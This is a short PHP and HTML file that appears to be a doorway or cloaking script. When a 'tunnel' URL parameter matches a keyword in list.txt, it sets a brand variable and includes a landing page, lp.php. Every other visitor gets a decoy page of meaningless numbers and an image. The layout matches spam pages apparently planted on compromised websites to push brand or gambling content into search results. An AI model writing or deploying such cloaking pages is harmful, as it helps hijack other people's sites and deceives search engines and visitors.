<?php
// Check if 'tunnel' parameter is set
if (isset($_GET['tunnel'])) {
    $array = file('list.txt', FILE_IGNORE_NEW_LINES);
    // Check if the 'tunnel' value is in the list
    if (in_array($_GET['tunnel'], $array, TRUE)) {
        $BRANDS = $_GET['tunnel'];
        $urlPath = "https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        include('lp.php');
        // Stop further execution if lp.php is included
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>684135468</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f7f7f7;
            padding: 50px;
        }

        h1 {
            font-size: 3em;
            color: #333;
        }

        p {
            font-size: 1.2em;
            color: #666;
        }

        img {
            max-width: 80%;
            border-radius: 10px;
            margin-top: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        a {
            text-decoration: none;
            color: #4CAF50;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>479846318</h1>
    <p>6848679468138</p>
    <img src='https://i.imgur.com/3Q4qah9.jpg' alt='dxy19'>
</body>
</html>
